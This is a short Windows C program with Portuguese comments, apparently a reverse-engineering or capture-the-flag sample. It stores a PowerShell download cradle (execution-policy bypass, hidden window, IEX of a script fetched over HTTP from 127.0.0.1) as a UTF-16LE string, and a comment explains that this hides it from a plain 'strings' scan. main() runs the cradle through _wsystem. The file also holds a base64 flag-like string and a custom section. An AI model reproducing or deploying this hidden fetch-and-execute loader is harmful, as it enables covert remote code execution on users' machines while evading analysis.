#include <windows.h>
#include <wchar.h>

// String ASCII
const char *info = "WHVwM3RAX2QzX2Uka2lsMA==";

// Payload em UTF-16LE - Invisível para 'strings' (precisa usar -e l)
const wchar_t *payload = L"powershell.exe -ep by -w h -c IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1/a.ps1')";

// Seção customizada. Não é o padrão de dados (.data)
__attribute__((section(".alien")))
const char extra[] = "Mi axô?";

int main() {
    // Usa variáveis para o compilador não removê-las na otimização
    _wsystem(payload); 

    return 0;
}
